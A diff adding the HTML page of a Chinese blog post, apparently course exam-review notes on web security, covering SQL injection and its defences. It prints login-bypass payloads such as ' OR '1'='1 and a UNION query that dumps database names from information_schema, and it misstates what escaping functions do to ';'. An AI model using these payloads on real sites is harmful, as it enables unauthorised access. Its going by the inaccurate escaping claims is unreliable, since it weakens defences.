@@ -1,0 +1,1400 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Web 安全技术与应用期末复习要点汇总 | Moyuan's website</title><meta name="author" content="moyuan"><meta name="copyright" content="moyuan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#F4F8FF"><meta name="description" content="全面梳理 OWASP Top 10 核心 Web 安全漏洞原理、代码审计特征与标准修复建议，期末复习高分速查。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web 安全技术与应用期末复习要点汇总">
+<meta property="og:url" content="https://moyuan10086.github.io/2025/01/05/web-security-exam-review/index.html">
+<meta property="og:site_name" content="Moyuan&#39;s website">
+<meta property="og:description" content="全面梳理 OWASP Top 10 核心 Web 安全漏洞原理、代码审计特征与标准修复建议，期末复习高分速查。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://moyuan10086.github.io/images/post-covers/post-cover-34.jpg">
+<meta property="article:published_time" content="2025-01-05T11:54:51.000Z">
+<meta property="article:modified_time" content="2026-09-05T22:36:57.394Z">
+<meta property="article:author" content="moyuan">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="认证与授权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://moyuan10086.github.io/images/post-covers/post-cover-34.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Web 安全技术与应用期末复习要点汇总",
+  "url": "https://moyuan10086.github.io/2025/01/05/web-security-exam-review/",
+  "image": "https://moyuan10086.github.io/images/post-covers/post-cover-34.jpg",
+  "datePublished": "2025-01-05T11:54:51.000Z",
+  "dateModified": "2026-09-05T22:36:57.394Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "moyuan",
+      "url": "https://moyuan10086.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://raw.githubusercontent.com/moyuan10086/photo/main/20220523004342199.png"><link rel="canonical" href="https://moyuan10086.github.io/2025/01/05/web-security-exam-review/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#101527')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#F4F8FF')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Web 安全技术与应用期末复习要点汇总',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css?v=20260906-toc-fix"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/newnewlogo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">215</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/posts/"><i class="fa-fw fas fa-list"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/images/post-covers/post-cover-34.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Moyuan's website</span></a><a class="nav-page-title" href="/"><span class="site-name">Web 安全技术与应用期末复习要点汇总</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-th"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/posts/"><i class="fa-fw fas fa-list"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/games/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Web 安全技术与应用期末复习要点汇总</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-05T11:54:51.000Z" title="发表于 2025-01-05 19:54:51">2025-01-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-09-05T22:36:57.394Z" title="更新于 2026-09-06 06:36:57">2026-09-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">期末复习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Web安全技术与应用期末复习资料"><a href="#Web安全技术与应用期末复习资料" class="headerlink" title="Web安全技术与应用期末复习资料"></a>Web安全技术与应用期末复习资料</h2><h3 id="题型分布"><a href="#题型分布" class="headerlink" title="题型分布"></a>题型分布</h3><ul>
+<li><strong>填空题</strong>：（2*10）</li>
+<li><strong>判断题</strong>：（2*10)</li>
+<li><strong>问答题</strong>：（60) 4/5</li>
+</ul>
+<h3 id="复习建议"><a href="#复习建议" class="headerlink" title="复习建议"></a>复习建议</h3><ul>
+<li>熟记相关定义的英文缩写及中文名称，确保对各类概念有清晰理解。</li>
+</ul>
+<h3 id="第一篇-预备知识"><a href="#第一篇-预备知识" class="headerlink" title="第一篇 预备知识"></a>第一篇 预备知识</h3><h4 id="项目1-Web-服务器平台安装与配置"><a href="#项目1-Web-服务器平台安装与配置" class="headerlink" title="项目1 Web 服务器平台安装与配置"></a>项目1 Web 服务器平台安装与配置</h4><ul>
+<li><p>原理：搭建一个基本的 Web 服务器平台，包括操作系统 (Windows Server 2008)、Web 服务器 (Apache)、数据库 (MySQL) 和服务器端编程语言 (PHP)。</p>
+</li>
+<li><p>概念：Web 服务器平台、操作系统、Web 服务器软件、数据库、服务器端编程语言、Web 开发基础 (HTML、CSS、JavaScript、PHP)。</p>
+</li>
+<li><p><strong>常见服务器操作系统</strong></p>
+<ul>
+<li>Windows Server</li>
+<li>Linux/Unix</li>
+</ul>
+</li>
+<li><strong>主要Web服务器及市场占有率</strong><ul>
+<li>Apache：47.0%</li>
+<li>Nginx：37.7%</li>
+<li>Microsoft IIS：10.0%</li>
+</ul>
+</li>
+<li><strong>Apache优势</strong><ul>
+<li>开源、免费</li>
+<li>强大的社区支持</li>
+</ul>
+</li>
+<li><strong>关系型数据库管理系统（RDBMS）</strong><ul>
+<li>Oracle, Microsoft SQL Server, IBM DB2, MySQL, PostgreSQL</li>
+</ul>
+</li>
+<li><strong>非关系型数据库（NoSQL）</strong><ul>
+<li>MongoDB, Redis, Memcached</li>
+</ul>
+</li>
+<li><strong>MySQL优势</strong><ul>
+<li>体积小、速度快、成本低</li>
+</ul>
+</li>
+<li><strong>服务器端编程语言</strong><ul>
+<li>PHP（83.2%）</li>
+<li>ASP, ASP.NET（13.8%）</li>
+<li>Java（2.3%）</li>
+</ul>
+</li>
+</ul>
+<h4 id="项目2-Web-开发基础"><a href="#项目2-Web-开发基础" class="headerlink" title="项目2 Web 开发基础"></a>项目2 Web 开发基础</h4><p>原理：学习 Web 开发基础，包括使用 MySQL 数据库进行数据操作，以及使用 HTML、CSS 和 JavaScript 进行静态网页和动态网页开发。</p>
+<p>概念：数据库操作 (DDL、DML)、SQL 语句、HTML、CSS、JavaScript、PHP 动态网页开发。</p>
+<p>知识储备</p>
+<ol>
+<li><strong>数据库管理系统 (DBMS)</strong></li>
+</ol>
+<ul>
+<li><p>定义：操纵和管理数据库的大型软件，分为关系型和非关系型。</p>
+</li>
+<li><p>常见DBMS：</p>
+<ul>
+<li><p>关系型：Oracle、MySQL、SQL Server。</p>
+</li>
+<li><p>非关系型：MongoDB、Redis。</p>
+</li>
+</ul>
+</li>
+<li><p>特点：</p>
+<ul>
+<li>关系型数据库：支持事务完整性和一致性，使用SQL语言操作。</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><strong>网页制作基础</strong></li>
+</ol>
+<ul>
+<li><p>静态网页：</p>
+<ul>
+<li><p>仅供浏览，不与用户交互。</p>
+</li>
+<li><p>示例：博客文章、QQ日志。</p>
+</li>
+</ul>
+</li>
+<li><p>动态网页：</p>
+<ul>
+<li><p>支持与Web服务器交互，如用户登录、评论功能。</p>
+</li>
+<li><p>示例：微博、论坛。</p>
+</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><strong>网页前端语言</strong></li>
+</ol>
+<ul>
+<li><p>HTML：</p>
+<ul>
+<li><p>定义网页的结构。</p>
+</li>
+<li><p>用标记语言描述内容，如表格、标题、图片。</p>
+</li>
+</ul>
+</li>
+<li><p>CSS：</p>
+<ul>
+<li><p>定义网页的外观样式。</p>
+</li>
+<li><p>层叠样式表，控制HTML元素的布局和设计。</p>
+</li>
+</ul>
+</li>
+<li><p>JavaScript：</p>
+<ul>
+<li><p>定义网页的行为。</p>
+</li>
+<li><p>添加交互功能，如动态时间显示。</p>
+</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li><strong>网页后端语言</strong></li>
+</ol>
+<ul>
+<li><p>PHP：</p>
+<ul>
+<li><p>服务器端脚本语言，用于生成动态网页。</p>
+</li>
+<li><p>特点：混合HTML标签编写，结果以HTML形式返回浏览器。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="第二篇-SQL-注入攻击及防护"><a href="#第二篇-SQL-注入攻击及防护" class="headerlink" title="第二篇 SQL 注入攻击及防护"></a>第二篇 SQL 注入攻击及防护</h3><h4 id="项目3-万能密码登录Post-型注入攻击"><a href="#项目3-万能密码登录Post-型注入攻击" class="headerlink" title="项目3 万能密码登录Post 型注入攻击"></a>项目3 万能密码登录Post 型注入攻击</h4><ul>
+<li><p>原理：利用 SQL 注入攻击，通过构造特殊的用户名或密码，绕过登录验证，获取管理员权限。</p>
+</li>
+<li><p>概念：SQL 注入攻击、万能密码、Session 验证、Post 请求、SQL 语句拼接。</p>
+</li>
+</ul>
+<h5 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h5><ul>
+<li><strong>定义</strong>：统一资源定位符（Uniform Resource Locator），用于定位Web资源。</li>
+<li><strong>结构</strong>：由协议、域名、路径、参数组成。</li>
+</ul>
+<h5 id="表单-Form"><a href="#表单-Form" class="headerlink" title="表单 (Form)"></a><strong>表单 (Form)</strong></h5><p>概念：用于用户输入数据并提交给服务器的HTML组件，包括文本框、按钮、下拉列表等。</p>
+<p>提交方式：</p>
+<p>GET：</p>
+<ul>
+<li><p>参数通过URL传递，适合少量数据提交。</p>
+</li>
+<li><p>不安全，数据会显示在地址栏。</p>
+</li>
+</ul>
+<p>POST：</p>
+<ul>
+<li><p>参数通过HTTP请求体传递，不显示在URL。</p>
+</li>
+<li><p>安全性较高，适合大数据量传输。</p>
+</li>
+</ul>
+<p>对比见下表：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>特性</strong></th>
+<th><strong>Get方式</strong></th>
+<th><strong>Post方式</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>URL显示</strong></td>
+<td>表单参数显示在URL中</td>
+<td>表单参数不显示在URL中</td>
+</tr>
+<tr>
+<td><strong>长度限制</strong></td>
+<td>有限制（URL长度限制）</td>
+<td>理论上无限</td>
+</tr>
+<tr>
+<td><strong>浏览器历史保存</strong></td>
+<td>参数保留在浏览器历史中</td>
+<td>参数不保留在浏览器历史中</td>
+</tr>
+<tr>
+<td><strong>URL参数保存</strong></td>
+<td>可通过保存URL的方式保存参数</td>
+<td>不可通过保存URL的方式保存参数</td>
+</tr>
+<tr>
+<td><strong>刷新提交机制</strong></td>
+<td>刷新不会重新提交</td>
+<td>刷新会重新提交</td>
+</tr>
+<tr>
+<td><strong>字符编码限制</strong></td>
+<td>仅限ASCII字符（可能显示乱码）</td>
+<td>无限制</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h5 id="Session机制"><a href="#Session机制" class="headerlink" title="Session机制"></a><strong>Session机制</strong></h5><p>原理：</p>
+<ul>
+<li><p>HTTP协议是无状态的，Session通过存储用户状态信息解决此问题。</p>
+</li>
+<li><p>用户登录成功后，服务器生成Session ID，用户浏览器保存该ID。</p>
+</li>
+<li><p>每次请求时携带Session ID，服务器验证用户状态。</p>
+</li>
+</ul>
+<p>流程：</p>
+<ul>
+<li><p>用户提交账号密码登录。</p>
+</li>
+<li><p>服务器验证信息后建立Session会话。</p>
+</li>
+<li><p>用户操作结束后，可通过注销功能销毁Session。</p>
+</li>
+</ul>
+<h5 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a><strong>SQL注入攻击</strong></h5><p>原理：</p>
+<p>通过在输入参数中插入恶意SQL语句，破坏原有SQL逻辑。</p>
+<p>典型形式：万能密码，如 ‘ <strong>OR</strong> ‘1’=’1，条件恒成立，绕过登录验证。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">AND</span> passcode<span class="hljs-operator">=</span><span class="hljs-string">&#x27;任意内容&#x27;</span>;<br></code></pre></td></tr></table></figure>
+<p>常见变体：</p>
+<ul>
+<li><p>注释型：’or 1=1— （将后续语句注释掉）。</p>
+</li>
+<li><p>条件型：’or 1=1#（将后续语句截断）。</p>
+</li>
+</ul>
+<p>危害：</p>
+<ul>
+<li><p>绕过权限登录。</p>
+</li>
+<li><p>非授权访问、篡改数据库。</p>
+</li>
+<li><p>挂马攻击、控制服务器。</p>
+</li>
+</ul>
+<h5 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a><strong>防护方法</strong></h5><p><strong>输入限制</strong></p>
+<p><strong>使用正则表达式过滤</strong>：</p>
+<p>限制用户名和密码输入的字符类型，只允许字母、数字和下划线，禁止单引号等危险符号。</p>
+<p>示例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-zA-Z0-9_]&#123;5,16&#125;$/&#x27;</span>, <span class="hljs-variable">$username</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;用户名格式错误！&quot;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><strong>通俗解释</strong>：<br>用户名只能是5到16位的英文字母、数字或下划线，如果输入包含<code>&#39;</code>、<code>--</code>等危险字符，会直接拦截。</p>
+<p><strong>前端校验</strong>：</p>
+<p>使用HTML5的<code>pattern</code>属性或JavaScript限制用户输入格式。</p>
+<p>示例代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;[a-zA-Z0-9_]&#123;5,16&#125;&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p><strong>SQL查询优化</strong></p>
+<p><strong>转义特殊字符</strong>：</p>
+<p>使用PHP函数对用户输入进行处理，转义SQL语句中的特殊字符，避免破坏语句结构。</p>
+<p>常用函数：</p>
+<ul>
+<li><code>addslashes()</code>：为单引号、双引号等特殊字符添加反斜杠。</li>
+<li><code>mysqli_real_escape_string()</code>：更安全地转义SQL语句中的特殊字符。</li>
+</ul>
+<p>示例代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$password</span>);<br></code></pre></td></tr></table></figure>
+<p><strong>通俗解释</strong>：<br>如果用户输入了<code>&#39;or 1=1--</code>，转义后会变成<code>\&#39;&#39;or 1=1--</code>，SQL语句就无法被注入。</p>
+<p><strong>参数化查询</strong>（最有效的方法）：</p>
+<p>将SQL语句和用户输入分开处理，防止用户输入被解释为SQL指令。</p>
+<p>使用PDO或MySQLi支持参数化查询，避免SQL注入。</p>
+<p>示例代码（PDO）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = :username AND passcode = :passcode&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-string">&#x27;:username&#x27;</span> =&gt; <span class="hljs-variable">$username</span>, <span class="hljs-string">&#x27;:passcode&#x27;</span> =&gt; <span class="hljs-variable">$password</span>]);<br></code></pre></td></tr></table></figure>
+<p><strong>通俗解释</strong>：<br>数据库会先处理SQL语句，再将用户输入作为参数加入，这样即使输入恶意代码，也只会当成普通文本。</p>
+<p><strong>防护方法对比</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>优点</th>
+<th>缺点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>正则表达式过滤</td>
+<td>简单易用，限制性强</td>
+<td>需要严格定义规则，可能误判合法输入</td>
+</tr>
+<tr>
+<td>转义特殊字符</td>
+<td>使用方便，兼容性好</td>
+<td>需注意宽字节字符集的风险</td>
+</tr>
+<tr>
+<td>参数化查询</td>
+<td>安全性高，根本性防护SQL注入</td>
+<td>程序复杂性增加，对旧项目兼容性一般</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="项目4-数据库暴库Get-型注入攻击"><a href="#项目4-数据库暴库Get-型注入攻击" class="headerlink" title="项目4 数据库暴库Get 型注入攻击"></a>项目4 数据库暴库Get 型注入攻击</h4><ul>
+<li><p>原理：利用 SQL 注入攻击，通过构造特殊的 URL 参数，获取数据库中的敏感信息，例如所有数据库名、所有数据表名、所有列名和所有数据。</p>
+</li>
+<li><p>概念：SQL 注入攻击、Get 请求、SQL 语句拼接、联合查询、信息泄露。</p>
+</li>
+</ul>
+<h5 id="HTML-Get方式提交原理"><a href="#HTML-Get方式提交原理" class="headerlink" title="HTML Get方式提交原理"></a><strong>HTML Get方式提交原理</strong></h5><p>Get方式特点：</p>
+<p>表单数据以 <code>变量=值</code> 的形式附加到URL后，使用 <code>?</code> 连接。</p>
+<p>多个变量之间使用<code>&amp;</code>分隔，例如：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://example.com/?id=1&amp;name=test<br></code></pre></td></tr></table></figure>
+<p>仅支持ASCII字符，非ASCII字符需通过URL编码（<code>%</code>加16进制）传递。</p>
+<h5 id="数据库暴库"><a href="#数据库暴库" class="headerlink" title="数据库暴库"></a><strong>数据库暴库</strong></h5><p><strong>定义</strong>：通过SQL注入等漏洞非法获取数据库内容。</p>
+<p>实现原理：</p>
+<p>利用SQL的<code>UNION</code>操作符，将攻击者构造的查询结果与正常查询结果合并。</p>
+<p>结合MySQL内置的<code>information_schema</code>数据库，可获取数据库、表及列的结构信息。</p>
+<p>示例查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> books <br><span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;-1&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, group_concat(schema_name), <span class="hljs-number">3</span> <br><span class="hljs-keyword">FROM</span> information_schema.schemata;<br></code></pre></td></tr></table></figure>
+<p>关键点：</p>
+<ul>
+<li><code>information_schema</code>：MySQL内置数据库，保存数据库结构信息。</li>
+<li><code>UNION</code>：合并两个<code>SELECT</code>结果集，要求列数和数据类型匹配。</li>
+<li><code>group_concat()</code>：将查询结果拼接为一行，方便显示。</li>
+</ul>
+<h5 id="Get型与Post型SQL注入的区别"><a href="#Get型与Post型SQL注入的区别" class="headerlink" title="Get型与Post型SQL注入的区别"></a><strong>Get型与Post型SQL注入的区别</strong></h5><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center"><strong>特性</strong></th>
+<th style="text-align:center"><strong>Get型</strong></th>
+<th style="text-align:center"><strong>Post型</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"><strong>提交方式</strong></td>
+<td style="text-align:center">参数附加在URL后</td>
+<td style="text-align:center">参数嵌入HTTP请求体</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>数据传递位置</strong></td>
+<td style="text-align:center">浏览器地址栏显示</td>
+<td style="text-align:center">不显示</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>适用场景</strong></td>
+<td style="text-align:center">超链接传递参数</td>
+<td style="text-align:center">表单提交数据</td>
+</tr>
+<tr>
+<td style="text-align:center"><strong>典型漏洞</strong></td>
+<td style="text-align:center">查询操作时的SQL拼接漏洞</td>
+<td style="text-align:center">表单提交数据时的SQL拼接漏洞</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h5 id="防护方式"><a href="#防护方式" class="headerlink" title="防护方式"></a><strong>防护方式</strong></h5><h6 id="使用转义函数"><a href="#使用转义函数" class="headerlink" title="使用转义函数"></a><strong>使用转义函数</strong></h6><p>通过 <strong>转义用户输入的内容</strong>，避免特殊字符（如单引号 <code>&#39;</code> 或双引号 <code>&quot;</code>）对SQL语句的破坏。</p>
+<p><strong>具体实现</strong></p>
+<p>使用PHP的 </p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">mysqli_escape_string()<br></code></pre></td></tr></table></figure>
+<p> 函数对输入内容进行处理：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_escape_string</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM books WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>
+<p>作用：</p>
+<p>将用户输入中可能影响SQL逻辑的字符进行转义，例如：</p>
+<ul>
+<li><code>&#39;</code> 转换为 <code>\&#39;</code></li>
+<li><code>&quot;</code> 转换为 <code>\&quot;</code></li>
+<li><code>;</code> 转换为 <code>\;</code></li>
+</ul>
+<p>优点：</p>
+<ul>
+<li>简单易用，能防护常见的注入攻击。</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li><strong>宽字符绕过风险</strong>：在某些情况下，攻击者可以利用宽字符编码绕过转义。</li>
